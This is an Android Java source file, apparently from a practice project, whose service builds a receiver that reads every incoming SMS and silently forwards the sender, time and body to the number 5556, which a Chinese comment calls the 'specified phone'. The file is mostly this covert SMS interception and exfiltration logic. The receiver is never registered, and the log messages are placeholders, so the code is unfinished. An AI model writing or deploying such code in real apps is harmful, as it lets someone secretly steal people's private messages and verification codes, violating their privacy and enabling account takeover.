package com.example.testone019.broadcast;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class ActionUserBootService extends Service {
	private String ACTION_SYATEM_BOOT_SMS = "android.provider.Telephony.SMS_RECEIVED";

	public void onCreate() {
		super.onCreate();
		Log.i("11", "1111111111");
		BroadcastReceiver receiver = new BroadcastReceiver() {
			public void onReceive(Context context, Intent intent) {
				StringBuffer sb = new StringBuffer();
				Bundle bundle = intent.getExtras();
				if(bundle != null){
					//通过pdus获得所有接收到得短信信息，获得短信的内容
					Object[] pdus = (Object[]) bundle.get("pdus");
					SmsMessage[] message = new SmsMessage[pdus.length];
					for(int i =0;i<message.length;i++){
					//获得单个短信内容，以pdu格式存储，并生成短信对象
						message[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
					}
					for(SmsMessage mge:message){
						sb.append("短信来自 :"+mge.getDisplayOriginatingAddress()+"\n");
						sb.append("短信的内容:"+mge.getMessageBody());
						String sender = mge.getDisplayOriginatingAddress();//获得短信发送者的号码
						String content = mge.getMessageBody();//获得短信的内容
						//短信发送的时间
						Date data = new Date(mge.getTimestampMillis());
						SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
						String sendTime = format.format(data);
						
						SmsManager manger = SmsManager.getDefault();
						manger.sendTextMessage("5556", null, "发送人:"+sender+"-----发送时间:"+sendTime+"----内容:"+content, null, null);
						//把拦截到的短信发送到指定的手机，此处为5556
						
					}
					
				}
//				String action = intent.getAction();
//				if (action.equals(ACTION_SYATEM_BOOT_SMS)) {
//					Toast.makeText(context, "静态态注册广播监听短信>开机以后启动服务》自定义", 0)
//							.show();
//				}
				
			}
		};

	}

	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.i("11", "2222222222");
		return super.onStartCommand(intent, flags, startId);
	}

	public IBinder onBind(Intent intent) {
		Log.i("11", "333333333333");
		return null;
	}

}
